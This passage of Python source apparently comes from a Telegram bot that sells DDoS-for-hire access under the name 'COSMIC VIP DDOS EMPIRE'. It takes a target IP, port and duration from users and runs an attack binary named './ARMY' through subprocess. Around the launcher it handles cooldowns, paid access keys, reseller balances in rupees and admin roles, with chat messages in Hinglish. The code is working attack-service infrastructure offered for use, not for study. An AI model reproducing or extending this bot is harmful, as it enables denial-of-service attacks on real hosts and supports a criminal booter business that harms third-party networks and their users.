                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🌌 {remaining_cooldown} seconds wait kar, jaanu! 😜"
                ), parse_mode='Markdown', reply_markup=create_back_button())
                return
        bot.send_message(message.chat.id, (
            "🎯 *Target Details Bhejo, Jaanu!* 🎯\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Target IP, port, aur duration (seconds) space se alag karke bhejo:"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        bot.register_next_step_handler(message, process_attack_details)
    else:
        bot.send_message(message.chat.id, (
            "⛔ *Unauthorized Access* ⛔\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Access ke liye @Rahul_618 se contact kar, hero! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
    logging.info(f"Attack command initiated by {user_id}")

def process_attack_details(message):
    if handle_non_dm(message):
        return
    user_id = str(message.chat.id)
    details = message.text.split()
    if len(details) != 3:
        bot.send_message(message.chat.id, (
            "❌ *Invalid Format* ❌\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Format: `IP port duration`! Thoda dhyan se, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    target, port, time = details[0], details[1], details[2]
    try:
        port = int(port)
        time = int(time)
        if time > 240 and not is_admin(user_id):
            bot.send_message(message.chat.id, (
                "❌ *Time Limit Exceeded* ❌\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "🌌 240 seconds se kam time use kar, hero! 😎"
            ), parse_mode='Markdown', reply_markup=create_back_button())
            return
        if not re.match(r"^(?:\d{1,3}\.){3}\d{1,3}$|^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", target):
            bot.send_message(message.chat.id, (
                "❌ *Invalid Target* ❌\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "🌌 Valid IP ya domain daal, jaanu! 😜"
            ), parse_mode='Markdown', reply_markup=create_back_button())
            return
        if not (1 <= port <= 65535):
            bot.send_message(message.chat.id, (
                "❌ *Invalid Port* ❌\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "🌌 Port 1-65535 ke beech hona chahiye, hero! 😎"
            ), parse_mode='Markdown', reply_markup=create_back_button())
            return
        record_command_logs(user_id, 'attack', target, port, time)
        log_command(user_id, target, port, time)
        full_command = ["./ARMY", target, str(port), str(time), "800"]
        username = message.chat.username or "No username"
        response = (
            f"🚀 *Cosmic Strike Launch Ho Gaya, Jaanu!* 🚀\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 *Target*: {target}:{port}\n"
            f"⏳ *Time*: {time} seconds\n"
            f"👤 *Attacker*: @{username}\n"
            f"Ab dekh, kaise dushman dhool chatta hai! 😜"
        )
        subprocess.Popen(full_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        threading.Timer(time, send_attack_finished_message, [message.chat.id, target, port, time]).start()
        if not is_admin(user_id):
            last_attack_time[user_id] = datetime.datetime.now()
        bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=create_back_button())
        logging.info(f"Attack launched by {user_id} on {target}:{port} for {time}s")
    except ValueError:
        bot.send_message(message.chat.id, (
            "❌ *Invalid Input* ❌\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Port ya time valid number hona chahiye, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        logging.error(f"Invalid attack input by {user_id}")

def send_attack_finished_message(chat_id, target, port, time):
    bot.send_message(chat_id, (
        "✅ *Cosmic Strike Khatam, Jaanu!* ✅\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🌌 Attack pura ho gaya! Ab kya plan hai, hero? 😎"
    ), parse_mode='Markdown', reply_markup=create_back_button())
    logging.info(f"Attack finished notification sent to {chat_id}")

# Handle user info request
@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    if handle_non_dm(message):
        return
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"
    if user_id in PERMANENT_ADMINS:
        role, key_expiration, balance = "Permanent Admin", "Unlimited Access", "Unlimited"
    elif user_id in dynamic_admins:
        role, key_expiration, balance = "Admin", "Unlimited Access", "Unlimited"
    elif user_id in resellers:
        role, balance, key_expiration = "Reseller", resellers.get(user_id, 0), "No access"
    elif user_id in users:
        role, key_expiration, balance = "User", users[user_id], "Not Applicable"
    else:
        role, key_expiration, balance = "Guest", "No active key", "Not Applicable"
    response = (
        f"👤 *TERA COSMIC PROFILE, JAANU!* 👤\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📛 *Username*: @{username}\n"
        f"🆔 *UserID*: {user_id}\n"
        f"🚹 *Role*: {role}\n"
        f"⏰ *Expiration*: {key_expiration}\n"
        f"💰 *Balance*: {balance}\n"
        f"🌌 Ab bol, kya karna hai, hero? 😜\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━"
    )
    bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=create_back_button())
    logging.info(f"User info accessed by {user_id}")

# Admin command to list authorized users
@bot.message_handler(commands=['users'])
def list_authorized_users(message):
    if handle_non_dm(message):
        return
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.send_message(message.chat.id, (
            "⛔ *Access Denied* ⛔\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Sirf admins users list kar sakte hain, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    if not users:
        bot.send_message(message.chat.id, (
            "⚠ *Koi Users Nahi* ⚠\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Koi authorized users nahi, hero! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    response = "✅ *Authorized Cosmic Users* ✅\n━━━━━━━━━━━━━━━━━━━━━━━\n"
    for user, expiration in users.items():
        user_info = bot.get_chat(user)
        username = user_info.username or user_info.first_name
        response += (
            f"🆔 *User ID*: {user}\n"
            f"📛 *Username*: @{username}\n"
            f"⏰ *Expires On*: {expiration}\n\n"
        )
    bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=create_back_button())
    logging.info(f"User list accessed by {user_id}")

# Admin command to remove a user
@bot.message_handler(commands=['remove'])
def remove_user(message):
    if handle_non_dm(message):
        return
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.send_message(message.chat.id, (
            "⛔ *Access Denied* ⛔\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Sirf admins users remove kar sakte hain, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    command = message.text.split()
    if len(command) != 2:
        bot.send_message(message.chat.id, (
            "📜 *Usage*: `/remove <user_id>`\n"
            "Example: `/remove 123456789`\n"
            "Chal, ID daal, hero! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    target_user_id = command[1]
    if target_user_id in users:
        del users[target_user_id]
        save_json(USER_FILE, users)
        bot.send_message(message.chat.id, (
            f"✅ *User Hata Diya!* ✅\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🆔 *User ID*: {target_user_id}\n"
            f"🌌 *Status*: Removed! Ab kya plan hai, jaanu? 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        logging.info(f"User {target_user_id} removed by {user_id}")
    else:
        bot.send_message(message.chat.id, (
            f"⚠ *User Nahi Mila* ⚠\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌌 User {target_user_id} nahi mila, hero! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        logging.info(f"User {target_user_id} not found for removal by {user_id}")

# Admin command to show resellers
@bot.message_handler(commands=['resellers'])
def show_resellers(message):
    if handle_non_dm(message):
        return
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.send_message(message.chat.id, (
            "⛔ *Access Denied* ⛔\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Sirf admins resellers dekh sakte hain, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    if not resellers:
        bot.send_message(message.chat.id, (
            "⚠ *Koi Resellers Nahi* ⚠\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Koi resellers nahi, hero! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    response = "✅ *Authorized Cosmic Resellers* ✅\n━━━━━━━━━━━━━━━━━━━━━━━\n"
    for reseller_id, balance in resellers.items():
        username = bot.get_chat(reseller_id).username or "Unknown"
        response += (
            f"📛 *Username*: @{username}\n"
            f"🆔 *UserID*: {reseller_id}\n"
            f"💰 *Balance*: {balance} Rs\n\n"
        )
    bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=create_back_button())
    logging.info(f"Reseller list accessed by {user_id}")

# Admin command to add balance to a reseller
@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    if handle_non_dm(message):
        return
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.send_message(message.chat.id, (
            "⛔ *Access Denied* ⛔\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Sirf admins balance add kar sakte hain, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    command = message.text.split()
    if len(command) != 3:
        bot.send_message(message.chat.id, (
            "📜 *Usage*: `/addbalance <reseller_id> <amount>`\n"
            "Example: `/addbalance 123456789 500`\n"
            "Chal, details daal, hero! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    reseller_id, amount = command[1], command[2]
    try:
        amount = float(amount)
        if amount < 0:
            raise ValueError("Amount cannot be negative")
        if reseller_id not in resellers:
            bot.send_message(message.chat.id, (
                "❌ *Reseller Nahi Mila* ❌\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "🌌 Reseller ID nahi mila, jaanu! 😜"
            ), parse_mode='Markdown', reply_markup=create_back_button())
            return
        resellers[reseller_id] += amount
        save_json(RESELLERS_FILE, resellers)
        bot.send_message(message.chat.id, (
            f"✅ *Balance Add Ho Gaya!* ✅\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💸 *Amount*: {amount} Rs\n"
            f"🆔 *Reseller ID*: {reseller_id}\n"
            f"💰 *New Balance*: {resellers[reseller_id]} Rs\n"
            f"Ab yeh aur keys bechega! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        logging.info(f"Balance {amount} Rs added to reseller {reseller_id} by {user_id}")
    except ValueError:
        bot.send_message(message.chat.id, (
            "❌ *Invalid Amount* ❌\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Amount valid number hona chahiye, hero! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        logging.error(f"Invalid balance amount for reseller {reseller_id} by {user_id}")

# Admin command to remove a reseller
@bot.message_handler(commands=['remove_reseller'])
def remove_reseller(message):
    if handle_non_dm(message):
        return
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.send_message(message.chat.id, (
            "⛔ *Access Denied* ⛔\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Sirf admins resellers remove kar sakte hain, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    command = message.text.split()
    if len(command) != 2:
        bot.send_message(message.chat.id, (
            "📜 *Usage*: `/remove_reseller <reseller_id>`\n"
            "Example: `/remove_reseller 123456789`\n"
            "Chal, ID daal, hero! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    reseller_id = command[1]
    if reseller_id not in resellers:
        bot.send_message(message.chat.id, (
            "❌ *Reseller Nahi Mila* ❌\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Reseller ID nahi mila, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    del resellers[reseller_id]
    save_json(RESELLERS_FILE, resellers)
    bot.send_message(message.chat.id, (
        f"✅ *Reseller Hata Diya!* ✅\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 *Reseller ID*: {reseller_id}\n"
        f"🌌 *Status*: Removed! Ab kya plan hai, hero? 😎"
    ), parse_mode='Markdown', reply_markup=create_back_button())
    logging.info(f"Reseller {reseller_id} removed by {user_id}")

# Handle inline keyboard callbacks
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = str(call.from_user.id)
    if call.message.chat.type != "private":
        chat_username = call.message.chat.username or "Unknown"
        bot.send_message(
            call.message.chat.id,
            (
                "⛔ *Cosmic Alert* ⛔\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"⚠ Thare group/channel (@{chat_username}) mein problem hai aa raha ha!\n"
                "📩 try bot ka DM mein use kar ka dekho, @Ddos_sadiq_bot pe chalo!\n"
                "━━━━━━━━━━━━━━━━━━━━━━━"
            ),
            parse_mode='Markdown'
        )
        bot.answer_callback_query(call.id)
        logging.warning(f"Non-DM callback attempt by {user_id} in @{chat_username}")
        return
    if call.data == "back_to_main":
        username = call.from_user.username or "Guest"
        role = "Permanent Admin" if user_id in PERMANENT_ADMINS else "Admin" if user_id in dynamic_admins else "Reseller" if user_id in resellers else "User" if user_id in users else "Guest"
        welcome_text = (
            "🌌 *COSMIC VIP DDOS EMPIRE* 🌌\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 *User*: @{username}\n"
            f"🚹 *Role*: {role}\n"
            "💥 Tap karke cosmic power unleash karo, jaanu! 😎\n"
            "━━━━━━━━━━━━━━━━━━━━━━━"
        )
        bot.edit_message_text(welcome_text, call.message.chat.id, call.message.message_id, reply_markup=create_main_menu(user_id), parse_mode='Markdown')
        bot.answer_callback_query(call.id)
        logging.info(f"Back to main menu by {user_id}")
        return
    if call.data == "attack":
        if is_admin(user_id):
            bot.send_message(call.message.chat.id, (
                "🎯 *Target Details Bhejo, Jaanu!* 🎯\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "🌌 Target IP, port, aur duration (seconds) space se alag karke bhejo:"
            ), parse_mode='Markdown', reply_markup=create_back_button())
            bot.register_next_step_handler(call.message, process_attack_details)
        elif user_id in users:
            expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
            if datetime.datetime.now() > expiration_date:
                bot.send_message(call.message.chat.id, (
                    "⏰ *Access Expired* ⏰\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "🌌 Tumhara access expire ho gaya! @Rahul_618 se contact kar, hero! 😎"
                ), parse_mode='Markdown', reply_markup=create_back_button())
                bot.answer_callback_query(call.id)
                return
            if user_id in last_attack_time:
                time_since_last_attack = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
                if time_since_last_attack < COOLDOWN_PERIOD:
                    remaining_cooldown = int(COOLDOWN_PERIOD - time_since_last_attack)
                    bot.send_message(call.message.chat.id, (
                        f"⌛ *Cooldown Active* ⌛\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"🌌 {remaining_cooldown} seconds wait kar, jaanu! 😜"
                    ), parse_mode='Markdown', reply_markup=create_back_button())
                    bot.answer_callback_query(call.id)
                    return
            bot.send_message(call.message.chat.id, (
                "🎯 *Target Details Bhejo, Jaanu!* 🎯\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "🌌 Target IP, port, aur duration (seconds) space se alag karke bhejo:"
            ), parse_mode='Markdown', reply_markup=create_back_button())
            bot.register_next_step_handler(call.message, process_attack_details)
        else:
            bot.send_message(call.message.chat.id, (
                "⛔ *Unauthorized Access* ⛔\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "🌌 Access ke liye @Rahul_618 se contact kar, hero! 😎"
            ), parse_mode='Markdown', reply_markup=create_back_button())
        logging.info(f"Attack callback by {user_id}")
    elif call.data == "my_info":
        my_info(call.message)
    elif call.data == "redeem_key":
        redeem_key_prompt(call.message)
    elif call.data == "gen_key":
        if is_admin(user_id) or user_id in resellers:
            bot.send_message(call.message.chat.id, (
                "🔑 *Key Generate Karo, Jaanu!* 🔑\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "📜 *Format*: `<duration> <keyname>`\n"
                "Example: `2hours mykey123`\n"
                "Supported durations: `h/hour/hours`, `d/day/days`, `m/month/months`\n"
                "Details bhejo, hero! 😎"
            ), parse_mode='Markdown', reply_markup=create_back_button())
            bot.register_next_step_handler(call.message, lambda msg: generate_key_from_callback(msg, user_id))
        else:
            bot.send_message(call.message.chat.id, (
                "⛔ *Access Denied* ⛔\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "🌌 Sirf admins ya resellers keys generate kar sakte hain, jaanu! 😜"
            ), parse_mode='Markdown', reply_markup=create_back_button())
        logging.info(f"Gen key callback by {user_id}")
    elif call.data == "all_keys":
        list_all_keys(call.message)
    elif call.data == "block_key":
        if is_admin(user_id):
            bot.send_message(call.message.chat.id, (
                "🚫 *Key Block Karo, Jaanu!* 🚫\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "📜 *Format*: `key <keyname>`\n"
                "Example: `key mykey123`\n"
                "Keyname bhejo, hero! 😎"
            ), parse_mode='Markdown', reply_markup=create_back_button())
            bot.register_next_step_handler(call.message, lambda msg: block_key_from_callback(msg, user_id))
        else:
            bot.send_message(call.message.chat.id, (
                "⛔ *Access Denied* ⛔\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "🌌 Sirf admins keys block kar sakte hain, jaanu! 😜"
            ), parse_mode='Markdown', reply_markup=create_back_button())
        logging.info(f"Block key callback by {user_id}")
    elif call.data == "logs":
        show_recent_logs(call.message)
    elif call.data == "add_admin":
        if user_id in PERMANENT_ADMINS:
            bot.send_message(call.message.chat.id, (
                "👑 *Admin Add Karo, Jaanu!* 👑\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "📜 *Format*: `<user_id>`\n"
                "Example: `123456789`\n"
                "User ID bhejo, hero! 😎"
            ), parse_mode='Markdown', reply_markup=create_back_button())
            bot.register_next_step_handler(call.message, lambda msg: add_admin_from_callback(msg, user_id))
        else:
            bot.send_message(call.message.chat.id, (
                "⛔ *Access Denied* ⛔\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "🌌 Sirf Cosmic Emperor (@sadiq9869) ya Galactic Overlord (@Rahul_618) admins add kar sakte hain, jaanu! 😜"
            ), parse_mode='Markdown', reply_markup=create_back_button())
        logging.info(f"Add admin callback by {user_id}")
    elif call.data == "remove_admin":
        if user_id in PERMANENT_ADMINS:
            bot.send_message(call.message.chat.id, (
                "🗑 *Admin Remove Karo, Jaanu!* 🗑\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "📜 *Format*: `<user_id>`\n"
                "Example: `123456789`\n"
                "User ID bhejo, hero! 😎"
            ), parse_mode='Markdown', reply_markup=create_back_button())
            bot.register_next_step_handler(call.message, lambda msg: remove_admin_from_callback(msg, user_id))
        else:
            bot.send_message(call.message.chat.id, (
                "⛔ *Access Denied* ⛔\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "🌌 Sirf Cosmic Emperor (@sadiq9869) ya Galactic Overlord (@Rahul_618) admins remove kar sakte hain, jaanu! 😜"
            ), parse_mode='Markdown', reply_markup=create_back_button())
        logging.info(f"Remove admin callback by {user_id}")
    bot.answer_callback_query(call.id)

def generate_key_from_callback(message, user_id):
    if handle_non_dm(message):
        return
    command = message.text.split()
    if len(command) != 2:
        bot.send_message(message.chat.id, (
            "📜 *Usage*: `<duration> <keyname>`\n"
            "Example: `2hours mykey123`\n"
            "Supported durations: `h/hour/hours`, `d/day/days`, `m/month/months`\n"
            "Chal, details daal, hero! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    duration, keyname = command[0], command[1]
    amount, unit = parse_duration(duration)
    if not amount or not unit:
        bot.send_message(message.chat.id, (
            "❌ *Invalid Duration* ❌\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Valid formats: `2h`, `2hours`, `3d`, `3days`, `1m`, `1month`! Thoda dhyan se, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    if not re.match(r"^[a-zA-Z0-9_-]{3,20}$", keyname):
        bot.send_message(message.chat.id, (
            "❌ *Invalid Keyname* ❌\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 3-20 characters (letters, numbers, _, - only)! Arre, sahi naam daal, hero! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    for key, details in keys.items():
        if details.get("keyname") == keyname:
            if details.get("expiration_time"):
                expiration = datetime.datetime.strptime(details["expiration_time"], '%Y-%m-%d %H:%M:%S')
                if datetime.datetime.now() < expiration:
                    bot.send_message(message.chat.id, (
                        f"❌ *Keyname Taken* ❌\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"🌌 Keyname '{keyname}' already active hai! Dusra naam try kar, jaanu! 😜"
                    ), parse_mode='Markdown', reply_markup=create_back_button())
                    return
                else:
                    keys[key]["duration"] = duration
                    keys[key]["amount"] = amount
                    keys[key]["unit"] = unit
                    keys[key]["expiration_time"] = None
                    keys[key]["keyname"] = keyname
                    save_json(KEY_FILE, keys)
                    cost = calculate_key_cost(amount, unit)
                    if is_admin(user_id):
                        response = (
                            f"🌟 *Jaanu, Key Update Ho Gaya!* 🌟\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"🔑 *Key*: `{key}`\n"
                            f"📛 *Keyname*: {keyname}\n"
                            f"⏳ *Duration*: {duration}\n"
                            f"📅 *Status*: Redeem ke liye ready! Chal, try kar! 😎"
                        )
                    elif user_id in resellers:
                        if resellers[user_id] >= cost:
                            resellers[user_id] -= cost
                            save_json(RESELLERS_FILE, resellers)
                            response = (
                                f"🌟 *Jaanu, Key Update Ho Gaya!* 🌟\n"
                                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                                f"🔑 *Key*: `{key}`\n"
                                f"📛 *Keyname*: {keyname}\n"
                                f"⏳ *Duration*: {duration}\n"
                                f"💸 *Cost*: {cost} Rs\n"
                                f"💰 *Remaining Balance*: {resellers[user_id]} Rs\n"
                                f"📅 *Status*: Redeem ke liye ready! Chal, try kar! 😎"
                            )
                        else:
                            response = (
                                f"❌ *Balance Kam Hai* ❌\n"
                                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                                f"💸 *Required*: {cost} Rs\n"
                                f"💰 *Available*: {resellers[user_id]} Rs\n"
                                f"Arre, balance bada, hero! 😜"
                            )
                    bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=create_back_button())
                    logging.info(f"Key {key} updated by {user_id}")
                    return
    key = create_random_key()
    keys[key] = {"duration": duration, "amount": amount, "unit": unit, "expiration_time": None, "keyname": keyname}
    save_json(KEY_FILE, keys)
    cost = calculate_key_cost(amount, unit)
    if is_admin(user_id):
        response = (
            f"🌟 *Jaanu, Key Generate Ho Gaya!* 🌟\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 *Key*: `{key}`\n"
            f"📛 *Keyname*: {keyname}\n"
            f"⏳ *Duration*: {duration}\n"
            f"📅 *Status*: Redeem ke liye ready! Chal, DM mein try kar! 😜"
        )
    elif user_id in resellers:
        if resellers[user_id] >= cost:
            resellers[user_id] -= cost
            save_json(RESELLERS_FILE, resellers)
            response = (
                f"🌟 *Jaanu, Key Generate Ho Gaya!* 🌟\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔑 *Key*: `{key}`\n"
                f"📛 *Keyname*: {keyname}\n"
                f"⏳ *Duration*: {duration}\n"
                f"💸 *Cost*: {cost} Rs\n"
                f"💰 *Remaining Balance*: {resellers[user_id]} Rs\n"
                f"📅 *Status*: Redeem ke liye ready! Chal, DM mein try kar! 😎"
            )
        else:
            response = (
                f"❌ *Balance Kam Hai* ❌\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"💸 *Required*: {cost} Rs\n"
                f"💰 *Available*: {resellers[user_id]} Rs\n"
                f"Arre, balance bada, hero! 😜"
            )
    bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=create_back_button())
    logging.info(f"Key {key} generated by {user_id}")

def block_key_from_callback(message, user_id):
    if handle_non_dm(message):
        return
    command = message.text.split()
    if len(command) != 2 or command[0].lower() != "key":
        bot.send_message(message.chat.id, (
            "📜 *Usage*: `key <keyname>`\n"
            "Example: `key mykey123`\n"
            "Chal, sahi keyname daal, hero! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    keyname = command[1]
    found = False
    for key, details in keys.items():
        if details.get("keyname") == keyname:
            if details.get("expiration_time"):
                expiration = datetime.datetime.strptime(details["expiration_time"], '%Y-%m-%d %H:%M:%S')
                if datetime.datetime.now() < expiration:
                    details["expiration_time"] = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    save_json(KEY_FILE, keys)
                    bot.send_message(message.chat.id, (
                        f"✅ *Key Block Ho Gaya!* ✅\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"📛 *Keyname*: {keyname}\n"
                        f"🔑 *Key*: `{key}`\n"
                        f"📅 *Status*: Expired! Chal, agla kaam bol! 😎"
                    ), parse_mode='Markdown', reply_markup=create_back_button())
                    logging.info(f"Key {key} blocked by {user_id}")
                else:
                    bot.send_message(message.chat.id, (
                        f"⚠ *Pehle Se Expired* ⚠\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"🌌 Keyname '{keyname}' pehle se expired hai, jaanu! 😜"
                    ), parse_mode='Markdown', reply_markup=create_back_button())
            else:
                bot.send_message(message.chat.id, (
                    f"⚠ *Not Redeemed* ⚠\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🌌 Keyname '{keyname}' abhi redeem nahi hua, hero! 😎"
                ), parse_mode='Markdown', reply_markup=create_back_button())
            found = True
            break
    if not found:
        bot.send_message(message.chat.id, (
            f"❌ *Key Nahi Mili* ❌\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌌 Keyname '{keyname}' exist nahi karta, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
    logging.info(f"Block key attempt for {keyname} by {user_id}")

def add_admin_from_callback(message, user_id):
    if handle_non_dm(message):
        return
    if user_id not in PERMANENT_ADMINS:
        bot.send_message(message.chat.id, (
            "⛔ *Access Denied* ⛔\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Sirf Cosmic Emperor (@sadiq9869) ya Galactic Overlord (@Rahul_618) admins add kar sakte hain, jaanu! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    new_admin_id = message.text.strip()
    if new_admin_id in PERMANENT_ADMINS:
        bot.send_message(message.chat.id, (
            "⚠ *Error* ⚠\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Permanent admins add nahi ho sakte, bhai! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    if new_admin_id in dynamic_admins:
        bot.send_message(message.chat.id, (
            f"⚠ *Error* ⚠\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌌 User {new_admin_id} already ek admin hai, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    try:
        user_info = bot.get_chat(new_admin_id)
        username = user_info.username or user_info.first_name
        dynamic_admins[new_admin_id] = {"username": f"@{username}"}
        save_json(ADMINS_FILE, dynamic_admins)
        bot.send_message(message.chat.id, (
            f"✅ *Naya Admin Add Ho Gaya!* ✅\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🆔 *User ID*: {new_admin_id}\n"
            f"📛 *Username*: @{username}\n"
            f"🌌 *Role*: Cosmic Admin\n"
            f"Ab yeh bhi cosmos rule karega! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        logging.info(f"Admin {new_admin_id} added by {user_id}")
    except Exception as e:
        bot.send_message(message.chat.id, (
            f"❌ *Error* ❌\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌌 Invalid user ID ya error: {str(e)}! Thoda check kar, bhai! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        logging.error(f"Error adding admin {new_admin_id}: {e}")

def remove_admin_from_callback(message, user_id):
    if handle_non_dm(message):
        return
    if user_id not in PERMANENT_ADMINS:
        bot.send_message(message.chat.id, (
            "⛔ *Access Denied* ⛔\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Sirf Cosmic Emperor (@sadiq9869) ya Galactic Overlord (@Rahul_618) admins hata sakte hain, jaanu! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    target_admin_id = message.text.strip()
    if target_admin_id in PERMANENT_ADMINS:
        bot.send_message(message.chat.id, (
            "⛔ *Error* ⛔\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Cosmic Emperor (@sadiq9869) ya Galactic Overlord (@Rahul_618) ko hata nahi sakte, bhai! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    if target_admin_id not in dynamic_admins:
        bot.send_message(message.chat.id, (
            f"⚠ *Error* ⚠\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌌 User {target_admin_id} admin nahi hai, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    del dynamic_admins[target_admin_id]
    save_json(ADMINS_FILE, dynamic_admins)
    bot.send_message(message.chat.id, (
        f"✅ *Admin Hata Diya!* ✅\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 *User ID*: {target_admin_id}\n"
